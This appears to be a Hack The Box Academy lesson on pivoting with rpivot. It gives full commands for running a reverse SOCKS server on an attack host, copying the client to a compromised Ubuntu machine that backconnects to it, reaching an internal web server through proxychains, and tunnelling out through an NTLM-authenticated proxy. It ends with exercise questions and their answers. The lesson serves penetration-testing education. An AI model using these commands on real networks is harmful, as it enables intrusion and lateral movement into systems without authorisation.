# Web Server Pivoting with Rpivot

[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (`172.16.5.135`), and we want to access that using the rpivot proxy.

![](https://academy.hackthebox.com/storage/modules/158/77.png)

We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.

**Cloning rpivot**

Web Server Pivoting with Rpivot

```shell-session
AIceBear@htb[/htb]$ sudo git clone https://github.com/klsecservices/rpivot.git
```

**Installing Python2.7**

Web Server Pivoting with Rpivot

```shell-session
AIceBear@htb[/htb]$ sudo apt-get install python2.7
```

We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using `server.py`.

**Running server.py from the Attack Host**

Web Server Pivoting with Rpivot

```shell-session
AIceBear@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Before running `client.py` we will need to transfer rpivot to the target. We can do this using this SCP command:

**Transfering rpivot to the Target**

Web Server Pivoting with Rpivot

```shell-session
AIceBear@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

**Running client.py from Pivot Target**

Web Server Pivoting with Rpivot

```shell-session
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999

Backconnecting to server 10.10.14.18 port 9999
```

**Confirming Connection is Established**

Web Server Pivoting with Rpivot

```shell-session
New connection from host 10.129.202.64, source port 35226
```

We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.

**Browsing to the Target Webserver using Proxychains**

Web Server Pivoting with Rpivot

```shell-session
proxychains firefox-esr 172.16.5.135:80
```

![](https://academy.hackthebox.com/storage/modules/158/rpivot\_proxychain.png)

Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have [HTTP-proxy with NTLM authentication](https://docs.microsoft.com/en-us/openspecs/office\_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:

**Connecting to a Web Server using HTTP-Proxy & NTLM Auth**

Web Server Pivoting with Rpivot

```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```

**Questions**

From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.

attack host

From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.

pivot host
